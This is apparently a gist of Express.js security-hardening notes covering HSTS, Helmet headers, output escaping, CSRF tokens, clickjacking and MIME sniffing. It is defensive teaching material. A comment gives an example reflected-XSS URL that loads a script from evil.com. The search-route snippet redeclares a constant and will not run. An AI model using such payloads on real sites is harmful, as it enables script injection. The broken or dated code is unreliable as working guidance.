// https://gist.github.com/cerebrl/6487587

// It’s usually important to stop if there’s any kind of error. You don’t want to be dealing
// with errant results—this can cause your server to have buggy behavior.

fs.readFile('myfile.txt', (err, data) => {
  if (err) {
    console.error(err);
    throw err;
  }
  console.log(data);
});


// Prevent XSS. Never trust user input. Assume that every route will be broken in some way.
app.get('/search', (req, res) => {
  // http://mysearchengine.com/search?q=crockford+backflip+video
  const search = req.query.q || ''; // Adds a default value if req.query.q is undefined
  // http://mysearchengine.com/search?q=abc&q=xyz
  const isArray = array => Array.isArray(array) && !!array.length;
  const search = (isArray(req.query.q) && req.query.q) || [];
});


// Force users to HTTPS
// Enable the “trust proxy” setting. Most of the time, when you deploy your applications,
// your server isn’t directly connecting to the client. If you’re deployed to
// the Heroku cloud platform, Heroku servers sit between you and the client. To tell Express
// about this, you need to enable the “trust proxy” setting.
app.enable('trust proxy');


// Keep users on HTTPS
// Once your users are on HTTPS, you’ll want to tell them to avoid going back to HTTP.
// New browsers support a feature called HTTP Strict Transport Security (HSTS). It’s a
// simple HTTP header that tells browsers to stay on HTTPS for a period of time.
// If you want to keep your users on HTTPS for one year (approximately 31,536,000 seconds),
// you’d set the following header -> Strict-Transport-Security: max-age=31536000
const helmet = require('helmet');
const ms = require('ms');
// Now, HSTS will be set on every request.
app.use(helmet.hsts({
  maxAge: ms('1 year'),
  includeSubdomains: true
}));


// Escaping (sanitize) user input
// In EJS, simply use the default <%= myString %> and don’t use the <%- userString %>.
// In Pug, this escaping is done by default.
// If you know that the user should be entering a URL, you’ll want to do more than
// escaping; you’ll want to do your best to validate that something is a URL. You’ll also
// want to call the built-in encodeURI function on a URL to make sure it’s safe.


// Mitigating XSS (cross-site scripting attacks) with HTTP headers
// There’s a simple security header called X-XSS-Protection. It can’t protect against all kinds of XSS,
// but it can protect against what’s called reflected XSS.
// https://mysearchengine.biz/search?query=<script%20src='http://evil.com/hack.js'></script>
// The first step against this attack is to sanitize the user’s input. After that, you can set
// the X-XSS-Protection header to keep some browsers from running that script should you make a mistake.
// In Helmet, it’s just one line:
app.use(helmet.xssFilter());
// Helmet also lets you set another header called Content-Security-Policy: https://helmetjs.github.io/docs/csp/


// Cross-site request forgery (CSRF or sometimes XSRF) prevention
// You need to do two things:
// 1. Create a random CSRF token every time you’re asking users for data.
// 2. Validate that random token every time you deal with that data.
<form method='post' action='https://mybank.biz/transfermoney'>
  <!-- Value of the CSRF token will be different for every user, often every time -->
  <input name='_csrf' type='hidden' value='1dmkTNkhePMTB0DlGLhm'>
  <input name='recipient' value='YourUsername' type='text'>
  <input name='amount' value='1000000' type='number'>
  <input type='submit'>
</form>


// No Express here
// By default, however, Express publicizes itself. In every request, there’s an HTTP
// header that identifies your site as powered by Express. “X-Powered-By” Express is sent
// with every request, by default. You can easily disable it with a setting:
app.disable('x-powered-by');


// Preventing clickjacking
// Most browsers (and all modern ones) listen for a header called X-Frame-Options.
// If it’s loading a frame or iframe and that page sends a restrictive X-Frame-Options,
// the browser won’t load the frame any longer. X-Frame-Options has three options. DENY keeps anyone
// from putting your site in a frame, period. SAMEORIGIN keeps anyone else from putting your site in
// a frame, but your own site is allowed. You can also let one other site through with the ALLOW-FROM
// option. I’d recommend the SAMEORIGIN or DENY options. As before, if you’re using
// Helmet, you can set them quite easily:
app.use(helmet.frameguard('sameorigin'));
// or
app.use(helmet.frameguard('deny'));


// Keeping Adobe products out of your site
// Adobe products like Flash Player and Reader can make cross-origin web requests. As a
// result, a Flash file could make requests to your server. If another website serves a
// malicious Flash file, users of that site could make arbitrary requests to your Express
// application (likely unknowingly). This could cause them to hammer your server with
// requests or to load resources you don’t intend them to.
// This is easily preventable by adding a file at the root of your site called crossdomain.xml.
// When an Adobe product is going to load a file off of your domain, it will first check the
// crossdomain.xml file to make sure your domain allows it. As the administrator, you can define
// this XML file to keep certain Flash users in or out of your site.
<?xml version="1.0"?>
<!DOCTYPE cross-domain-policy SYSTEM "http://www.adobe.com/xml/dtds/cross-domain-policy.dtd">
<cross-domain-policy>
<site-control permitted-cross-domain-policies="none">
</cross-domain-policy>


// Don’t let browsers infer the file type
// Imagine a user has uploaded a plain-text file to your server called file.txt. Your server
// serves this with a text/plain content type, because it’s plain text. So far, this is simple.
// But what if file.txt contains some JavaScript? Even though you’re serving this file as plain text,
// this looks like JavaScript, and some browsers will try to sniff the file type. That means that
// you can still run that file with <script src="file.txt"></script>. Many browsers will allow file.txt
// to be run even if the content type isn’t for JavaScript!
app.use(helmet.noSniff());
